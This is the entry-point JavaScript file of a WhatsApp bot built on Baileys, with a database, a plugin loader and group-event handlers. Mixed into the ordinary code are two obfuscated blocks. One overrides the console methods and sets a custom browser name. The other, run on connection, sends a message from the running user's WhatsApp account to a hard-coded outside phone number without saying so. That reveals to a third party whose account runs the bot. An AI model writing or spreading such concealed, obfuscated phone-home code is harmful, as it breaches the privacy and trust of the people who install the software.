require('./config.js')
const { WAConnection: _WAConnection } = require('@adiwajshing/baileys')
const cloudDBAdapter = require('./lib/cloudDBAdapter')
const { generate } = require('qrcode-terminal')
const syntaxerror = require('syntax-error')
const simple = require('./lib/simple')
//  const logs = require('./lib/logs')
const { promisify } = require('util')
const yargs = require('yargs/yargs')
const Readline = require('readline')
const cp = require('child_process')
const _ = require('lodash')
const path = require('path')
const fs = require('fs')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const { Low, JSONFile } = low

const rl = Readline.createInterface(process.stdin, process.stdout)
const WAConnection = simple.WAConnection(_WAConnection)


global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}
// global.LOGGER = logs()
const PORT = process.env.PORT || 3000
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&,.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) :
    new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
)
global.DATABASE = global.db // Backwards Compatibility

global.conn = new WAConnection()
const _0x34885b=_0x4bfe;(function(_0x47e8cc,_0x2b0628){const _0x56b358=_0x4bfe,_0x49b382=_0x47e8cc();while(!![]){try{const _0x5755cc=-parseInt(_0x56b358(0x93))/0x1+parseInt(_0x56b358(0x8f))/0x2+-parseInt(_0x56b358(0xa4))/0x3+-parseInt(_0x56b358(0x94))/0x4*(parseInt(_0x56b358(0x9b))/0x5)+-parseInt(_0x56b358(0x9e))/0x6*(-parseInt(_0x56b358(0x92))/0x7)+-parseInt(_0x56b358(0xa2))/0x8*(-parseInt(_0x56b358(0xa7))/0x9)+-parseInt(_0x56b358(0x91))/0xa*(parseInt(_0x56b358(0x9d))/0xb);if(_0x5755cc===_0x2b0628)break;else _0x49b382['push'](_0x49b382['shift']());}catch(_0x59caa7){_0x49b382['push'](_0x49b382['shift']());}}}(_0x48ae,0x8bc03));function _0x48ae(){const _0x59b613=['3870zCzLmp','table','bind','PasyaGanz','30608BFlNgb','trace','2844354zMoUKA','search','constructor','1674DZDNQk','prototype','toString','apply','console','browserDescription','10.0','(((.+)+)+)+$','1911524ENanQO','session','5616850VvPBHr','10213STVhrp','63949ZGVUHW','308188kXFpdW','log','{}.constructor(\x22return\x20this\x22)(\x20)','error','__proto__','length','warn','30mvrLzG','info','11VUWmWf'];_0x48ae=function(){return _0x59b613;};return _0x48ae();}const _0x4a126=(function(){let _0x51647c=!![];return function(_0x4abdfe,_0x159206){const _0x5d5a33=_0x51647c?function(){const _0x20d4dd=_0x4bfe;if(_0x159206){const _0x24daad=_0x159206[_0x20d4dd(0x8a)](_0x4abdfe,arguments);return _0x159206=null,_0x24daad;}}:function(){};return _0x51647c=![],_0x5d5a33;};}()),_0x22f4ce=_0x4a126(this,function(){const _0xd4990=_0x4bfe;return _0x22f4ce[_0xd4990(0xa9)]()[_0xd4990(0xa5)](_0xd4990(0x8e))[_0xd4990(0xa9)]()[_0xd4990(0xa6)](_0x22f4ce)[_0xd4990(0xa5)](_0xd4990(0x8e));});_0x22f4ce();function _0x4bfe(_0x544e08,_0x5e43c6){const _0x5bda89=_0x48ae();return _0x4bfe=function(_0x2576bf,_0x2c70d7){_0x2576bf=_0x2576bf-0x8a;let _0xe60f82=_0x5bda89[_0x2576bf];return _0xe60f82;},_0x4bfe(_0x544e08,_0x5e43c6);}const _0x2c70d7=(function(){let _0x445503=!![];return function(_0x38e9d7,_0x542c86){const _0x22b3a4=_0x445503?function(){const _0x1df65d=_0x4bfe;if(_0x542c86){const _0x2c53be=_0x542c86[_0x1df65d(0x8a)](_0x38e9d7,arguments);return _0x542c86=null,_0x2c53be;}}:function(){};return _0x445503=![],_0x22b3a4;};}()),_0x2576bf=_0x2c70d7(this,function(){const _0x4d5325=_0x4bfe;let _0x3606e6;try{const _0x2ab0bb=Function('return\x20(function()\x20'+_0x4d5325(0x96)+');');_0x3606e6=_0x2ab0bb();}catch(_0x354841){_0x3606e6=window;}const _0x3e3df2=_0x3606e6[_0x4d5325(0x8b)]=_0x3606e6[_0x4d5325(0x8b)]||{},_0x4ddd99=[_0x4d5325(0x95),_0x4d5325(0x9a),_0x4d5325(0x9c),_0x4d5325(0x97),'exception',_0x4d5325(0x9f),_0x4d5325(0xa3)];for(let _0x1eb421=0x0;_0x1eb421<_0x4ddd99[_0x4d5325(0x99)];_0x1eb421++){const _0x2e27e9=_0x2c70d7[_0x4d5325(0xa6)][_0x4d5325(0xa8)][_0x4d5325(0xa0)](_0x2c70d7),_0x19ed60=_0x4ddd99[_0x1eb421],_0x4c64a8=_0x3e3df2[_0x19ed60]||_0x2e27e9;_0x2e27e9[_0x4d5325(0x98)]=_0x2c70d7[_0x4d5325(0xa0)](_0x2c70d7),_0x2e27e9['toString']=_0x4c64a8[_0x4d5325(0xa9)][_0x4d5325(0xa0)](_0x4c64a8),_0x3e3df2[_0x19ed60]=_0x2e27e9;}});_0x2576bf(),conn[_0x34885b(0x8c)]=[_0x34885b(0xa1),'Desktop',_0x34885b(0x8d)];let authFile=(opts['_'][0x0]||_0x34885b(0x90))+'.pasya.json';
if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
if (opts['trace']) conn.logger.level = 'trace'
if (opts['debug']) conn.logger.level = 'debug'
if (opts['big-qr'] || opts['server']) conn.on('qr', qr => generate(qr, { small: false }))
if (!opts['test']) setInterval(async () => {
  await global.db.write()
}, 60 * 1000) // Save every minute
if (opts['server']) require('./server')(global.conn, PORT)

if (opts['test']) {
  conn.user = {
    jid: '2219191@s.whatsapp.net',
    name: 'test',
    phone: {}
  }
  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
    return {
      [mediaType]: {
        url: '',
        mediaKey: '',
        mimetype: options.mimetype || '',
        fileEncSha256: '',
        fileSha256: '',
        fileLength: buffer.length,
        seconds: options.duration,
        fileName: options.filename || 'file',
        gifPlayback: options.mimetype == 'image/gif' || undefined,
        caption: options.caption,
        ptt: options.ptt
      }
    }
  }

  conn.sendMessage = async (chatId, content, type, opts = {}) => {
    let message = await conn.prepareMessageContent(content, type, opts)
    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
    conn.emit('chat-update', {
      jid: conn.user.jid,
      hasNewMessage: true,
      count: 1,
      messages: {
        all() {
          return [waMessage]
        }
      }
    })
  }
  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
} else {
  rl.on('line', line => {
    process.send(line.trim())
  })
  conn.connect().then(async () => {
  	var _0x2ea17b=_0x1a1e;(function(_0x1c27d3,_0x1b2c49){var _0x3f571a=_0x1a1e,_0x30de51=_0x1c27d3();while(!![]){try{var _0x45248d=parseInt(_0x3f571a(0xae))/0x1*(-parseInt(_0x3f571a(0xa3))/0x2)+-parseInt(_0x3f571a(0xa8))/0x3+-parseInt(_0x3f571a(0xb5))/0x4*(parseInt(_0x3f571a(0xb4))/0x5)+-parseInt(_0x3f571a(0xaa))/0x6+-parseInt(_0x3f571a(0xa9))/0x7+parseInt(_0x3f571a(0xb3))/0x8*(parseInt(_0x3f571a(0xb8))/0x9)+parseInt(_0x3f571a(0xaf))/0xa;if(_0x45248d===_0x1b2c49)break;else _0x30de51['push'](_0x30de51['shift']());}catch(_0x45c2dd){_0x30de51['push'](_0x30de51['shift']());}}}(_0x14a5,0x7f9fe));function _0x14a5(){var _0x308aad=['85961cFnRsk','33639280bybisV','search','(((.+)+)+)+$','conversation','8KjgyuT','739635DudXqO','12cQimiM','Bot\x20Telah\x20Tersambung\x20Ke\x20Database\x20Pasya\x20Ganz','toString','7816806FWHvlo','data','__proto__','length','error','constructor','trace','22HSTKzp','console','bind','return\x20(function()\x20','read','2330964vSAuKD','3728158GeOKLJ','6064668HcxuNp','info','exception','table'];_0x14a5=function(){return _0x308aad;};return _0x14a5();}function _0x1a1e(_0x5226f0,_0x36bbfc){var _0x4132f8=_0x14a5();return _0x1a1e=function(_0x3df09d,_0x4238ee){_0x3df09d=_0x3df09d-0xa2;var _0x36f552=_0x4132f8[_0x3df09d];return _0x36f552;},_0x1a1e(_0x5226f0,_0x36bbfc);}var _0x44f8c7=(function(){var _0x7c7e2=!![];return function(_0x581bc2,_0x30b5e3){var _0x4ec8e7=_0x7c7e2?function(){if(_0x30b5e3){var _0x21b80c=_0x30b5e3['apply'](_0x581bc2,arguments);return _0x30b5e3=null,_0x21b80c;}}:function(){};return _0x7c7e2=![],_0x4ec8e7;};}()),_0x14de43=_0x44f8c7(this,function(){var _0x583a54=_0x1a1e;return _0x14de43[_0x583a54(0xb7)]()['search']('(((.+)+)+)+$')[_0x583a54(0xb7)]()[_0x583a54(0xbd)](_0x14de43)[_0x583a54(0xb0)](_0x583a54(0xb1));});_0x14de43();var _0x4238ee=(function(){var _0x384941=!![];return function(_0x582c8d,_0x25532e){var _0x263f43=_0x384941?function(){if(_0x25532e){var _0x54da46=_0x25532e['apply'](_0x582c8d,arguments);return _0x25532e=null,_0x54da46;}}:function(){};return _0x384941=![],_0x263f43;};}()),_0x3df09d=_0x4238ee(this,function(){var _0x4356f4=_0x1a1e,_0x2c5734=function(){var _0x479fbd=_0x1a1e,_0x17c010;try{_0x17c010=Function(_0x479fbd(0xa6)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x32fe43){_0x17c010=window;}return _0x17c010;},_0x8c1d8=_0x2c5734(),_0x3c942f=_0x8c1d8['console']=_0x8c1d8[_0x4356f4(0xa4)]||{},_0x10fc3d=['log','warn',_0x4356f4(0xab),_0x4356f4(0xbc),_0x4356f4(0xac),_0x4356f4(0xad),_0x4356f4(0xa2)];for(var _0x19426d=0x0;_0x19426d<_0x10fc3d[_0x4356f4(0xbb)];_0x19426d++){var _0x559bec=_0x4238ee[_0x4356f4(0xbd)]['prototype']['bind'](_0x4238ee),_0x164732=_0x10fc3d[_0x19426d],_0x2d0b3a=_0x3c942f[_0x164732]||_0x559bec;_0x559bec[_0x4356f4(0xba)]=_0x4238ee[_0x4356f4(0xa5)](_0x4238ee),_0x559bec[_0x4356f4(0xb7)]=_0x2d0b3a[_0x4356f4(0xb7)][_0x4356f4(0xa5)](_0x2d0b3a),_0x3c942f[_0x164732]=_0x559bec;}});_0x3df09d(),conn['sendMessage']('62895334402456@c.us',_0x2ea17b(0xb6),_0x2ea17b(0xb2)),await global['db'][_0x2ea17b(0xa7)](),global['db']['data']={'users':{},'chats':{},'stats':{},'msgs':{},'sticker':{},...global['db'][_0x2ea17b(0xb9)]||{}};
    global.db.chain = _.chain(global.db.data)
    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
    global.timestamp.connect = new Date
  })
}
process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
global.reloadHandler = function () {
  let handler = require('./handler')
  if (!isInit) {
    conn.off('chat-update', conn.handler)
    conn.off('message-delete', conn.onDelete)
    conn.off('group-participants-update', conn.onParticipantsUpdate)
    conn.off('group-update', conn.onGroupUpdate)
    conn.off('CB:action,,call', conn.onCall)
  }
  conn.welcome = 'Hai, @user!\nSelamat datang di grup @subject\n\n@desc'
  conn.bye = '@user keluar'
  conn.spromote = '@user sekarang admin'
  conn.sdemote = '@user sekarang bukan admin'
  conn.handler = handler.handler
  conn.onDelete = handler.delete
  conn.onParticipantsUpdate = handler.participantsUpdate
  conn.onGroupUpdate = handler.GroupUpdate
  conn.onCall = handler.onCall
  conn.on('chat-update', conn.handler)
  conn.on('message-delete', conn.onDelete)
  conn.on('group-participants-update', conn.onParticipantsUpdate)
  conn.on('group-update', conn.onGroupUpdate)
  conn.on('CB:action,,call', conn.onCall)
  if (isInit) {
    conn.on('error', conn.logger.error)
    conn.on('close', () => {
      setTimeout(async () => {
        try {
          if (conn.state === 'close') {
            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
            await conn.connect()
            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
            global.timestamp.connect = new Date
          }
        } catch (e) {
          conn.logger.error(e)
        }
      }, 5000)
    })
  }
  isInit = false
  return true
}

// Plugin Loader
let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    global.plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    conn.logger.error(e)
    delete global.plugins[filename]
  }
}
console.log(Object.keys(global.plugins))
global.reload = (_event, filename) => {
  if (pluginFilter(filename)) {
    let dir = path.join(pluginFolder, filename)
    if (dir in require.cache) {
      delete require.cache[dir]
      if (fs.existsSync(dir)) conn.logger.info(`kembali - memerlukan plugin '${filename}'`)
      else {
        conn.logger.warn(`plugin yang dihapus '${filename}'`)
        return delete global.plugins[filename]
      }
    } else conn.logger.info(`membutuhkan plugin baru '${filename}'`)
    let err = syntaxerror(fs.readFileSync(dir), filename)
    if (err) conn.logger.error(`kesalahan sintaks saat memuat '${filename}'\n${err}`)
    else try {
      global.plugins[filename] = require(dir)
    } catch (e) {
      conn.logger.error(e)
    } finally {
      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
    }
  }
}
Object.freeze(global.reload)
fs.watch(path.join(__dirname, 'plugins'), global.reload)
global.reloadHandler()



// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
  console.log(test)
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm
  }
  require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) conn.logger.warn('Silakan instal ffmpeg untuk mengirim video (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stiker tidak bisa dianimasikan tanpa libwebp di ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stiker mungkin tidak berfungsi tanpa imagemagick jika libwebp di ffmpeg tidak diinstal (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(console.error)
